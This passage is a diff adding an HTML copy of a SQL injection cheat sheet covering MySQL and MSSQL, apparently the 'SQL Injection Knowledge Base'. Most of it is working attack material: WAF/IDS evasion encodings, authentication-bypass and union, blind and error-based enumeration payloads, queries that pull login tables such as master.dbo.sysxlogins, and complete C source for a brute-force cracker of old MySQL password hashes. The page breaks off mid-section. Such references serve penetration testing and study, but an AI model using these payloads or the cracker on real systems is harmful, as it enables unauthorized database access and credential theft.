+					Certain functions can also be obfuscated with comments and whitespaces.
+				</p>
+				<ul class="data example">
+					<li class="code">
+						VERSION<b class="injection">/**/%A0</b> (<b class="injection">/*comment*/</b>)
+					</li>
+				</ul>
+
+				<h3 id="MySQL_Encodings">Encodings</h3>
+				<p>
+					Encoding your injection can sometimes be useful for WAF/IDS evasion.
+				</p>
+				<table>
+					<tbody><tr>
+						<td>URL Encoding</td>
+						<td class="code">SELECT %74able_%6eame FROM information_schema.tables;</td>
+					</tr>
+					<tr>
+						<td>Double URL Encoding</td>
+						<td class="code">SELECT %2574able_%256eame FROM information_schema.tables;</td>
+					</tr>
+					<tr>
+						<td>Unicode Encoding</td>
+						<td class="code">SELECT %u0074able_%u6eame FROM information_schema.tables;</td>
+					</tr>
+					<tr>
+						<td>Invalid Hex Encoding (ASP)</td>
+						<td class="code">SELECT %tab%le_%na%me FROM information_schema.tables;</td>
+					</tr>
+				</tbody></table>
+
+				<h3 id="MySQL_Avoiding_Keywords">Avoiding Keywords</h3>
+				<p>
+					If an IDS/WAF has blocked certain keywords, there are other ways of getting around it without using encodings.
+				</p>
+				<ul class="data">
+					<li>
+						information_schema.tables
+					</li>
+				</ul>
+				<table>
+					<tbody><tr>
+						<td>Spaces</td>
+						<td class="code">information_schema .   tables</td>
+					</tr>
+					<tr>
+						<td>Backticks</td>
+						<td class="code">`information_schema`.`tables`</td>
+					</tr>
+					<tr>
+						<td>Specific Code</td>
+						<td class="code">/*!information_schema.tables*/</td>
+					</tr>
+					<tr>
+						<td>Alternative Names</td>
+						<td class="code">information_schema.partitions
+						<br>
+						information_schema.statistics
+						<br>
+						information_schema.key_column_usage
+						<br>
+						information_schema.table_constraints</td>
+					</tr>
+				</tbody></table>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							The alternate names may depend on a PRIMARY Key being present in the table.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MySQL_Operators">Operators</h2>
+				<table>
+					<tbody><tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_and" target="_blank">
+						<code>
+							AND
+						</code>,
+						<code>
+							&amp;&amp;
+						</code></a></td>
+						<td>Logical AND</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/assignment-operators.html#operator_assign-equal" target="_blank">
+						<code>
+							=
+						</code></a></td>
+						<td>Assign a value (as part of a <a href="http://dev.mysql.com/doc/refman/5.6/en/set-statement.html" target="_blank">
+						<code>
+							SET
+						</code></a> statement, or as part of the
+						<code>
+							SET
+						</code> clause in an <a href="http://dev.mysql.com/doc/refman/5.6/en/update.html" target="_blank">
+						<code>
+							UPDATE
+						</code></a> statement) </td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/assignment-operators.html#operator_assign-value" target="_blank">
+						<code>
+							:=
+						</code></a></td>
+						<td>Assign a value</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_between" target="_blank">
+						<code>
+							BETWEEN ... AND ...
+						</code></a></td>
+						<td>Check whether a value is within a range of values</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/cast-functions.html#operator_binary" target="_blank">
+						<code>
+							BINARY
+						</code></a></td>
+						<td>Cast a string to a binary string</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-and" target="_blank">
+						<code>
+							&amp;
+						</code></a></td>
+						<td>Bitwise AND</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-invert" target="_blank">
+						<code>
+							~
+						</code></a></td>
+						<td>Invert bits</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-or" target="_blank">
+						<code>
+							|
+						</code></a></td>
+						<td>Bitwise OR</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-xor" target="_blank">
+						<code>
+							^
+						</code></a></td>
+						<td>Bitwise XOR</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/control-flow-functions.html#operator_case" target="_blank">
+						<code>
+							CASE
+						</code></a></td>
+						<td>Case operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_div" target="_blank">
+						<code>
+							DIV
+						</code></a></td>
+						<td>Integer division</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_divide" target="_blank">
+						<code>
+							/
+						</code></a></td>
+						<td>Division operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_equal-to" target="_blank">
+						<code>
+							&lt;=&gt;
+						</code></a></td>
+						<td>NULL-safe equal to operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_equal" target="_blank">
+						<code>
+							=
+						</code></a></td>
+						<td>Equal operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_greater-than-or-equal" target="_blank">
+						<code>
+							&gt;=
+						</code></a></td>
+						<td>Greater than or equal operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_greater-than" target="_blank">
+						<code>
+							&gt;
+						</code></a></td>
+						<td>Greater than operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is-not-null" target="_blank">
+						<code>
+							IS NOT NULL
+						</code></a></td>
+						<td>NOT NULL value test</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is-not" target="_blank">
+						<code>
+							IS NOT
+						</code></a></td>
+						<td>Test a value against a boolean</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is-null" target="_blank">
+						<code>
+							IS NULL
+						</code></a></td>
+						<td>NULL value test</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is" target="_blank">
+						<code>
+							IS
+						</code></a></td>
+						<td>Test a value against a boolean</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_left-shift" target="_blank">
+						<code>
+							&lt;&lt;
+						</code></a></td>
+						<td>Left shift</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_less-than-or-equal" target="_blank">
+						<code>
+							&lt;=
+						</code></a></td>
+						<td>Less than or equal operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_less-than" target="_blank">
+						<code>
+							&lt;
+						</code></a></td>
+						<td>Less than operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/string-comparison-functions.html#operator_like" target="_blank">
+						<code>
+							LIKE
+						</code></a></td>
+						<td>Simple pattern matching</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_minus" target="_blank">
+						<code>
+							-
+						</code></a></td>
+						<td>Minus operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_mod" target="_blank">
+						<code>
+							% or MOD
+						</code></a></td>
+						<td>Modulo operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_not-between" target="_blank">
+						<code>
+							NOT BETWEEN ... AND ...
+						</code></a></td>
+						<td>Check whether a value is not within a range of values</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_not-equal" target="_blank">
+						<code>
+							!=
+						</code>,
+						<code>
+							&lt;&gt;
+						</code></a></td>
+						<td>Not equal operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/string-comparison-functions.html#operator_not-like" target="_blank">
+						<code>
+							NOT LIKE
+						</code></a></td>
+						<td>Negation of simple pattern matching</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/regexp.html#operator_not-regexp" target="_blank">
+						<code>
+							NOT REGEXP
+						</code></a></td>
+						<td>Negation of REGEXP</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_not" target="_blank">
+						<code>
+							NOT
+						</code>,
+						<code>
+							!
+						</code></a></td>
+						<td>Negates value</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_or" target="_blank">
+						<code>
+							||
+						</code>,
+						<code>
+							OR
+						</code></a></td>
+						<td>Logical OR</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_plus" target="_blank">
+						<code>
+							+
+						</code></a></td>
+						<td>Addition operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/regexp.html#operator_regexp" target="_blank">
+						<code>
+							REGEXP
+						</code></a></td>
+						<td>Pattern matching using regular expressions</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_right-shift" target="_blank">
+						<code>
+							&gt;&gt;
+						</code></a></td>
+						<td>Right shift</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/regexp.html#operator_regexp" target="_blank">
+						<code>
+							RLIKE
+						</code></a></td>
+						<td>Synonym for REGEXP</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/string-functions.html#operator_sounds-like" target="_blank">
+						<code>
+							SOUNDS LIKE
+						</code></a></td>
+						<td>Compare sounds</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_times" target="_blank">
+						<code>
+							*
+						</code></a></td>
+						<td>Multiplication operator</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_unary-minus" target="_blank">
+						<code>
+							-
+						</code></a></td>
+						<td>Change the sign of the argument</td>
+					</tr>
+					<tr>
+						<td><a href="http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_xor" target="_blank">
+						<code>
+							XOR
+						</code></a></td>
+						<td>Logical XOR</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_Constants">Constants</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">current_user</td>
+					</tr>
+					<tr>
+						<td class="code">null, \N</td>
+					</tr>
+					<tr>
+						<td class="code">true, false</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_Password_Hashing">Password Hashing</h2>
+				<p>
+					Prior to MySQL 4.1, password hashes computed by the PASSWORD() function are 16 bytes long. Such hashes look like this:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">PASSWORD('mypass')</td>
+						<td class="code">6f8c114b58f2ce9e</td>
+					</tr>
+				</tbody></table>
+				<p>
+					As of MySQL 4.1, the PASSWORD() function has been modified to produce a longer 41-byte hash value:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">PASSWORD('mypass')</td>
+						<td class="code">*6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_Password_Cracking">Password Cracking</h2>
+				<p>
+					Cain &amp; Abel and John the Ripper are both capable of cracking MySQL 3.x-6.x passwords.
+				</p>
+				<p>
+					A Metasploit module for JTR can be found <a href="http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast" target="_blank" rel="noopener">here</a>.
+				</p>
+				<h3>MySQL &lt; 4.1 Password Cracker</h3>
+				<p>
+					This tool is a high-speed brute-force password cracker for MySQL hashed passwords. It can break an 8-character password containing any printable ASCII characters in a matter of hours on an ordinary PC.
+				</p>
+				<ul class="data">
+					<small> 						<pre>/* This program is public domain. Share and enjoy.
+*
+* Example:
+* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
+* $ MySQLfast 6294b50f67eda209
+* Hash: 6294b50f67eda209
+* Trying length 3
+* Trying length 4
+* Found pass: barf
+*
+* The MySQL password hash function could be strengthened considerably
+* by:
+* - making two passes over the password
+* - using a bitwise rotate instead of a left shift
+* - causing more arithmetic overflows
+*/
+
+#include &lt;stdio.h&gt;
+
+typedef unsigned long u32;
+
+/* Allowable characters in password; 33-126 is printable ascii */
+#define MIN_CHAR 33
+#define MAX_CHAR 126
+
+/* Maximum length of password */
+#define MAX_LEN 12
+
+#define MASK 0x7fffffffL
+
+int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
+{
+  int i, c;
+  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
+  u32 newstate1, newstate2, newstate3;
+  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
+  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
+  i = -1;
+  sum = 7;
+  state1_ary[0] = 1345345333L;
+  state2_ary[0] = 0x12345671L;
+
+  while (1) {
+    while (i &lt; stop) {
+      i++;
+      pass_ary[i] = MIN_CHAR;
+      step_ary[i] = (state1_ary[i] &amp; 0x3f) + sum;
+      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] &lt;&lt; 8);
+      sum += MIN_CHAR;
+      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
+      state2_ary[i+1] = state2_ary[i]
+        + ((state2_ary[i] &lt;&lt; 8) ^ state1_ary[i+1]);
+    }
+
+    state1 = state1_ary[i+1];
+    state2 = state2_ary[i+1];
+    step = (state1 &amp; 0x3f) + sum;
+    xor1 = step*MIN_CHAR + (state1 &lt;&lt; 8);
+    xor2 = (state2 &lt;&lt; 8) ^ state1;
+
+    for (c = MIN_CHAR; c &lt;= MAX_CHAR; c++, xor1 += step) {
+      newstate2 = state2 + (xor1 ^ xor2);
+      newstate1 = state1 ^ xor1;
+
+      newstate3 = (targ2 - newstate2) ^ (newstate2 &lt;&lt; 8);
+      div = (newstate1 &amp; 0x3f) + sum + c;
+      diff = ((newstate3 ^ newstate1) - (newstate1 &lt;&lt; 8)) &amp; MASK;
+      if (diff % div != 0) continue;
+      d = diff / div;
+      if (d &lt; MIN_CHAR || d &gt; MAX_CHAR) continue;
+
+      div = (newstate3 &amp; 0x3f) + sum + c + d;
+      diff = ((targ1 ^ newstate3) - (newstate3 &lt;&lt; 8)) &amp; MASK;
+      if (diff % div != 0) continue;
+      e = diff / div;
+      if (e &lt; MIN_CHAR || e &gt; MAX_CHAR) continue;
+
+      pass_ary[i+1] = c;
+      pass_ary[i+2] = d;
+      pass_ary[i+3] = e;
+      return 1;
+    }
+
+    while (i &gt;= 0 &amp;&amp; pass_ary[i] &gt;= MAX_CHAR) {
+      sum -= MAX_CHAR;
+      i--;
+    }
+    if (i &lt; 0) break;
+    pass_ary[i]++;
+    xor_ary[i] += step_ary[i];
+    sum++;
+    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
+    state2_ary[i+1] = state2_ary[i]
+      + ((state2_ary[i] &lt;&lt; 8) ^ state1_ary[i+1]);
+  }
+
+  return 0;
+}
+
+void crack(char *hash)
+{
+  int i, len;
+  u32 targ1, targ2, targ3;
+  int pass[MAX_LEN];
+
+  if ( sscanf(hash, "%8lx%lx", &amp;targ1, &amp;targ2) != 2 ) {
+    printf("Invalid password hash: %s\n", hash);
+    return;
+  }
+  printf("Hash: %08lx%08lx\n", targ1, targ2);
+  targ3 = targ2 - targ1;
+  targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);
+  targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);
+  targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);
+
+  for (len = 3; len &lt;= MAX_LEN; len++) {
+    printf("Trying length %d\n", len);
+    if ( crack0(len-4, targ1, targ3, pass) ) {
+      printf("Found pass: ");
+      for (i = 0; i &lt; len; i++)
+        putchar(pass[i]);
+      putchar('\n');
+      break;
+    }
+  }
+  if (len &gt; MAX_LEN)
+    printf("Pass not found\n");
+}
+
+int main(int argc, char *argv[])
+{
+  int i;
+  if (argc &lt;= 1)
+    printf("usage: %s hash\n", argv[0]);
+  for (i = 1; i &lt; argc; i++)
+    crack(argv[i]);
+  return 0;
+}
+				</pre> </small>
+				</ul>
+			</ul>
+
+			<ul id="MSSQL_Content">
+				<h1>MSSQL</h1>
+				<h2 id="MSSQL_Default_Databases">Default Databases</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">pubs</td>
+						<td>Not available on MSSQL 2005</td>
+					</tr>
+					<tr>
+						<td class="code">model</td>
+						<td>Available in all versions</td>
+					</tr>
+					<tr>
+						<td class="code">msdb</td>
+						<td>Available in all versions</td>
+					</tr>
+					<tr>
+						<td class="code">tempdb</td>
+						<td>Available in all versions</td>
+					</tr>
+					<tr>
+						<td class="code">northwind</td>
+						<td>Available in all versions</td>
+					</tr>
+					<tr>
+						<td class="code">information_schema</td>
+						<td>Availalble from MSSQL 2000 and higher</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MSSQL_Comment_Out_Query">Comment Out Query</h2>
+				<p>
+					The following can be used to comment out the rest of the query after your injection:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">/*</td>
+						<td>C-style comment</td>
+					</tr>
+					<tr>
+						<td class="code">--</td>
+						<td>SQL comment</td>
+					</tr>
+					<tr>
+						<td class="code">;%00</td>
+						<td>Nullbyte</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT * FROM Users WHERE username = '' OR 1=1 <b class="injection">--</b>' AND password = '';
+					</li>
+					<li class="code">
+						SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3<b class="injection">/*</b>';
+					</li>
+				</ul>
+
+				<h2 id="MSSQL_Testing_Version">Testing Version</h2>
+				<ul class="data">
+					<li>
+						@@VERSION
+					</li>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li>
+						True if MSSQL version is 2008.
+					</li>
+					<li class="code">
+						SELECT * FROM Users WHERE id = '1' AND <b class="injection">@@VERSION</b> LIKE '%2008%';
+					</li>
+				</ul>
+				<p>
+					<i> Note:
+					</i></p><ul class="note"><i>
+						<li class="note">
+							Output will also contain the version of the Windows Operating System.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MSSQL_Database_Credentials">Database Credentials</h2>
+				<table>
+					<tbody><tr>
+						<td>Database..Table</td>
+						<td class="code">master..syslogins, master..sysprocesses</td>
+					</tr>
+					<tr>
+						<td>Columns</td>
+						<td class="code">name, loginame</td>
+					</tr>
+					<tr>
+						<td>Current User</td>
+						<td class="code">user, system_user, suser_sname(), is_srvrolemember('sysadmin')</td>
+					</tr>
+					<tr>
+						<td>Database Credentials</td>
+						<td class="code">SELECT user, password FROM master.dbo.sysxlogins</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li>
+						Return current user:
+					</li>
+					<li class="code">
+						SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+					</li>
+					<br>
+					<li>
+						Check if user is admin:
+					</li>
+					<li class="code">
+						SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
+					</li>
+				</ul>
+
+				<h2 id="MSSQL_Database_Names">Database Names</h2>
+				<table>
+					<tbody><tr>
+						<td>Database.Table</td>
+						<td class="code">master..sysdatabases</td>
+					</tr>
+					<tr>
+						<td>Column</td>
+						<td class="code">name</td>
+					</tr>
+					<tr>
+						<td>Current DB</td>
+						<td class="code">DB_NAME(i)</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">DB_NAME(5)</b>;
+					</li>
+					<li class="code">
+						SELECT <b class="injection">name</b> FROM <b class="injection">master..sysdatabases</b>;
+					</li>
+				</ul>
+
+				<h2 id="MSSQL_Server_Hostname">Server Hostname</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">@@SERVERNAME</td>
+					</tr>
+					<tr>
+						<td class="code">SERVERPROPERTY()</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">SERVERPROPERTY(</b>'productversion'<b class="injection">)</b>, <b class="injection">SERVERPROPERTY(</b>'productlevel'<b class="injection">)</b>, <b class="injection">SERVERPROPERTY(</b>'edition'<b class="injection">)</b>;
+					</li>
+				</ul>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							SERVERPROPERTY() is available from MSSQL 2005 and higher.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MSSQL_Tables_And_Columns">Tables and Columns</h2>
+				<h3 id="MSSQL_Determining_Number_Of_Columns">Determining number of columns</h3>
+				<ul class="data">
+					<code class="code">
+						ORDER BY n+1;
+					</code>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<p>
+						Given the query:
+						<code>
+							SELECT username, password, permission FROM Users WHERE id = '1';
+						</code>
+					</p>
+					<table class="noborder">
+						<tbody><tr>
+							<td class="code">1' ORDER BY 1--</td>
+							<td class="true">True</td>
+						</tr>
+						<tr>
+							<td class="code">1' ORDER BY 2--</td>
+							<td class="false">True</td>
+						</tr>
+						<tr>
+							<td class="code">1' ORDER BY 3--</td>
+							<td class="true">True </td>
+						</tr>
+						<tr>
+							<td class="code">1' ORDER BY 4--</td>
+							<td class="false">False - Query is only using 3 columns</td>
+						</tr>
+						<tr>
+							<td class="code">-1' UNION SELECT 1,2,3--</td>
+							<td class="true">True</td>
+						</tr>
+					</tbody></table>
+				</ul>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							Keep incrementing the number until you get a False response.
+						</li>
+					</i></ul>
+				<p></p>
+				<br>
+				<p>
+					The following can be used to get the columns in the current query.
+				</p>
+				<ul class="data">
+					<code class="code">
+						GROUP BY / HAVING
+					</code>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data">
+					<p>
+						Given the query:
+						<code>
+							SELECT username, password, permission FROM Users WHERE id = '1';
+						</code>
+					</p>
+					<table class="noborder">
+						<tbody><tr>
+							<td class="code">1' HAVING 1=1--</td>
+							<td>Column 'Users.username' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.</td>
+						</tr>
+						<tr>
+							<td class="code">1' GROUP BY username HAVING 1=1--</td>
+							<td>Column 'Users.password' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.</td>
+						</tr>
+						<tr>
+							<td class="code">1' GROUP BY username, password HAVING 1=1--</td>
+							<td>Column 'Users.permission' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.</td>
+						</tr>
+						<tr>
+							<td class="code">1' GROUP BY username, password, permission HAVING 1=1--</td>
+							<td>No Error</td>
+						</tr>
+					</tbody></table>
+				</ul>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							No error will be returned once all columns have been included.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h3 id="MSSQL_Retrieving_Tables">Retrieving Tables</h3>
+				<p>
+					We can retrieve the tables from two different databases, information_schema.tables or from master..sysobjects.
+				</p>
+				<div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+					<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
+						<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Retrieving_Tables_Union" target="_blank" rel="noopener">Union</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Retrieving_Tables_Blind" target="_blank" rel="noopener">Blind</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Retrieving_Tables_Error" target="_blank" rel="noopener">Error</a>
+						</li>
+					</ul>
+
+					<div id="MSSQL_Retrieving_Tables_Union" class="ui-tabs-panel ui-widget-content ui-corner-bottom">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">UNION SELECT name FROM master..sysobjects WHERE xtype='U'</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MSSQL_Retrieving_Tables_Blind" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; 'A'</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MSSQL_Retrieving_Tables_Error" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)</td>
+							</tr>
+							<tr>
+								<td class="code">AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))</td>
+							</tr>
+						</tbody></table>
+					</div>
+				</div>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							Xtype = 'U' is for User-defined tables. You can use 'V' for views.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h3 id="MSSQL_Retrieving_Columns">Retrieving Columns</h3>
+				<p>
+					We can retrieve the columns from two different databases, information_schema.columns or masters..syscolumns.
+				</p>
+				<div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+					<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
+						<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Retrieving_Columns_Union" target="_blank" rel="noopener">Union</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Retrieving_Columns_Blind" target="_blank" rel="noopener">Blind</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Retrieving_Columns_Error" target="_blank" rel="noopener">Error</a>
+						</li>
+					</ul>
+
+					<div id="MSSQL_Retrieving_Columns_Union" class="ui-tabs-panel ui-widget-content ui-corner-bottom">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MSSQL_Retrieving_Columns_Blind" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns &gt; 'A'</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MSSQL_Retrieving_Columns_Error" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)</td>
+							</tr>
+							<tr>
+								<td class="code">AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))</td>
+							</tr>
+						</tbody></table>
+					</div>
+				</div>
+
+				<h3 id="MSSQL_Retrieving_Multiple_Tables_Columns">Retrieving Multiple Tables/Columns at once</h3>
+				<p>
+					The following 3 queries will create a temporary table/column and insert all the user-defined tables into it. It will then dump the table content and finish by deleting the table.
+				</p>
+				<ul class="data example">
+					<li>
+						Create Temp Table/Column and Insert Data:
+					</li>
+					<li class="code">
+						AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name&gt;@xy SELECT @xy AS xy INTO TMP_DB END;
+					</li>
+				</ul>
+				<ul class="data example">
+					<li>
+						Dump Content:
+					</li>
+					<li class="code">
+						AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
+					</li>
+				</ul>
+				<ul class="data example">
+					<li>
+						Delete Table:
+					</li>
+					<li class="code">
+						AND 1=0; DROP TABLE TMP_DB;
+					</li>
+				</ul>
+				<p>
+					An easier method is available starting with MSSQL 2005 and higher. The XML function path() works as a concatenator, allowing the retrieval of all tables with 1 query.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')</td>
+						<td>SQL Server 2005+</td>
+					</tr>
+				</tbody></table>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
